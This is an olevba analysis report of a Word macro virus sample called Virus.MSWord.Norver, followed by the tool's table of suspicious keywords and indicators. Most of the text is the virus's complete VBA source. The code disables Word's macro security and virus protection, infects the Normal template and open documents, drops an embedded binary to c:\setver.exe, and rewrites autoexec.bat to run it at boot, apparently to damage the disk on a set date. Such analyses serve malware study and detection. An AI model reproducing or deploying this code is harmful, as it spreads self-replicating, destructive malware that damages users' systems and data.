olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Norver
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Norver - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Version 200012085
Private Function SourceCode(sm As Variant) As String
    SourceCode = sm.lines(1, sm.CountOfLines)
End Function
Private Sub kernel(Source As Object, Destination As Object)
    Dim code As String
    code = SourceCode(Source.CodeModule)
    Call delete(Destination.CodeModule)
    Destination.CodeModule.AddFromString code
End Sub
Private Sub document_close()
On Error Resume Next

If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
    CommandBars("Macro").Controls.Item(3).Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1
Else
    CommandBars("Tools").Controls("Macro").Enabled = False
    Options.ConfirmConversions = 0
    Options.VirusProtection = 0
End If
Options.SaveNormalPrompt = 0

Dim DocInfected, NormalInfected  As Boolean
Dim FirstLine As String
Dim DocVer, NorVer, MaxVer As Long

FirstLine = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.lines(1, 1)
DocVer = Val(Right$(FirstLine, 9))
FirstLine = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.lines(1, 1)
NorVer = Val(Right$(FirstLine, 9))
If (DocVer > NorVer) Then
    NormalInfected = False
    DocInfected = True
    MaxVer = DocVer
ElseIf (NorVer > DocVer) Then
    NormalInfected = True
    DocInfected = False
    MaxVer = NorVer
Else
    NormalInfected = True
    DocInfected = True
    MaxVer = NorVer
End If

If Val(System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "KCPA")) < MaxVer Then
    If (WriteBinaryCode() = True) Then
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "KCPA") = Str(MaxVer)
    End If
End If

'if necessary to infect
If (((DocInfected And NormalInfected) = False) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate)) Then
    Dim snt, sd As Boolean
    If (NormalInfected = False) Then
        'infect normal
        snt = NormalTemplate.Saved
        Call kernel(ActiveDocument.VBProject.VBComponents.Item(1), NormalTemplate.VBProject.VBComponents.Item(1))
        If snt Then NormalTemplate.Save
    ElseIf (DocInfected = False) Then
        'infect activedoc
        If (Mid(ActiveDocument.FullName, 2, 1) <> ":") Then
            Randomize
            SaveName = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(WindowsFolder) & "\temp\~WRL" & Int((9999 - 1000 + 1) * Rnd + 1000) & ".tmp"
            ActiveDocument.SaveAs FileName:=SaveName
        End If
        sd = ActiveDocument.Saved
        Call kernel(NormalTemplate.VBProject.VBComponents.Item(1), ActiveDocument.VBProject.VBComponents.Item(1))
        If sd Then ActiveDocument.Save
    End If
End If
End Sub
Private Sub delete(DC As Object)
    li = DC.CountOfLines
    DC.DeleteLines 1, li
End Sub
Private Function WriteBinaryCode() As Boolean
Dim a(10) As Variant
Dim v As String
Dim dd, mm, yy As Integer
a(0) = Array(77, 90, 61, 0, 3, 0, 3, 0, 32, 0, 49, 0, 255, 255, 36, 0, 0, 1, 0, 0, 0, 0, 0, 0, 30, 0, 0, 0, 1, 0, 10, 0, 0, 0, 20, 0, 0, 0, 47, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
a(1) = Array(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
a(2) = Array(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 184, 1, 2, 185, 1, 0, 186, 128, 0, 187, 35, 0, 142, 195, 187, 16, 1, 205, 19, 184, 35, 0, 142, 216, 161, 48, 1, 61, 205, 26, 116, 8, 184, 1, 3, 185, 2, 0, 205, 19, 184, 1, 3, 185, 1, 0, 187, 0, 0, 142, 195, 187, 61, 0, 205, 19, 184, 0, 76, 205, 33, 51, 192, 142, 208, 188, 0, 124, 251, 80, 7, 80, 31, 252, 190, 0, 124, 191, 0, 6, 80, 185, 0, 2, 243, 164, 184, 30)
a(3) = Array(6, 80, 203, 180, 4, 205, 26, 129, 249, 0, 32, 124, 45, 129, 250, 41, 18, 124, 39, 187, 0, 124, 185, 0, 2, 198, 7, 0, 67, 226, 250, 185, 1, 0, 51, 219, 142, 195, 187, 0, 124, 186, 128, 0, 184, 1, 3, 205, 19, 66, 129, 250, 130, 0, 126, 244, 235, 254, 184, 1, 2, 185, 2, 0, 186, 128, 0, 51, 219, 142, 195, 187, 0, 124, 205, 19, 51, 192, 80, 83, 51, 192, 142, 216, 142, 192, 184, 190, 125, 139, 240, 184, 190, 7, 139, 248, 185, 64, 0, 252, 243, 164, 184, 1, 3, 185, 1, 0, 51, 219, 142, 195, 187, 0, 6, 205, 19, 203, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
a(4) = Array(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
a(5) = Array(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 85, 170)
yy = Val(Mid(Date, 1, 4))
mm = Val(Mid(Date, 6, 2))
If Val(Mid(Date, 9, 2)) > 22 Then
    mm = mm + 1
    If mm = 13 Then
        mm = 1
        yy = yy + 1
    End If
End If
If mm = 2 Then mm = mm + 1
'set the day of Armageddon, the 29th day of the next month
a(3)(16) = ((mm \ 10) * 16) + (mm Mod 10)
a(3)(9) = ((yy Mod 100) \ 10) * 16 + (yy Mod 1000)
a(3)(10) = (yy \ 1000) * 16 + ((yy \ 100) Mod 10)
Open "c:\setver.exe" For Binary Access Write As #1
For j = 0 To 5
    For i = 0 To UBound(a(j))
        Put #1, , CByte(a(j)(i))
    Next i
Next j
Close #1
Open "c:\autoexec.bat" For Output As #1
Print #1, "@rem DON'T remove the following line for the compatibility"
Print #1, "@c:\setver.exe"
Print #1, "@del setver.exe"
Print #1, "@del autoexec.bat"
Close #1
WriteBinaryCode = True
End Function















































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |document_close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |setver.exe          |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

